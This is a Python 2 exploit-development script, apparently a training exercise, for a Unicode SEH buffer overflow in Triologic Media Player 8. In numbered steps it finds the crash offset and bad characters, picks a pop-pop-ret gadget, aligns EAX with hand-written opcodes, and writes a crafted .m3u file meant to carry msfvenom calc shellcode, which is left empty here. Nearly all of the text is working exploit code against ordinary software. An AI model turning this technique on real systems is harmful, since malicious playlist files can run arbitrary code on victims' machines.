#!/usr/bin/python2

# Triologic Media Player 8
# Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/14673
# Exploit tested on Windows XP Pro SP3 FR
 
#Step 1: Replicate the crash
buffer = b"A"*5000

#Step 2: Find the offset
buffer = b""

#Step 3: Overwrite the offset (nSEH, SEH)
buffer = b"A"*536 + b"B"*2 + b"C"*2 + b"D"*4462

#Step 4: Find badchars -> \x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f
badchars = b""
badchars += b"\x81\x8d\x8f\x9d"
badchars += b""
buffer = b"A"*536 + b"B"*2 + b"C"*2 + badchars
buffer += b"D"*(5000-len(buffer))
#=> Balek!!!

#Step 5: pop pop ret
# !mona seh -cp unicode
# 0x004100f2 : pop esi # pop ebx # ret 0x04 | startnull,unicode {PAGE_EXECUTE_READWRITE} [triomp8.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v8.0.0.0 (C:\Program Files\Triologic\Triologic Media Player\triomp8.exe)
pop_pop_ret = b"\xf2\x41"
buffer = b"A"*536 + b"\x41\x71" + pop_pop_ret + b"D"*4462
buffer += b"D"*(5000-len(buffer))

#Step 6: Call EAX
#The fourth address on the stack point near our buffer, we have to get it, play with it and call it

get_eax = b""
get_eax += b"\x58"          # POP EAX
get_eax += b"\x71"          # PADDING
get_eax += b"\x58"          # POP EAX
get_eax += b"\x71"          # PADDING
get_eax += b"\x58"          # POP EAX
get_eax += b"\x71"          # PADDING
get_eax += b"\x58"          # POP EAX
get_eax += b"\x71"          # PADDING
get_eax += b"\x05\x02\x11"  # ADD EAX,0x11000200
get_eax += b"\x71"          # PADDING
get_eax += b"\x2d\x01\x11"  # SUB EAX,0x11000100 
get_eax += b"\x71"          # PADDING
get_eax += b"\x50"          # PUSH EAX
get_eax += b"\x71"          # PADDING
get_eax += b"\xC3"          # RETN

buffer = b"A"*536 + b"\x41\x71" + pop_pop_ret + get_eax
buffer += b"D"*(5000-len(buffer))

#Step 7: Exploit

# msfvenom -p windows/exec CMD=calc > shellcode.bin
# ./alpha2 eax --unicode < shellcode.bin 
shellcode = b""

buffer = b""
buffer += b"A"*536  + b"\x41\x71" + pop_pop_ret + get_eax + b"D"*105 + shellcode
buffer += b"E"*(5000-len(buffer))

textfile = open("triologic.m3u" , 'wb')
textfile.write(buffer)
textfile.close()
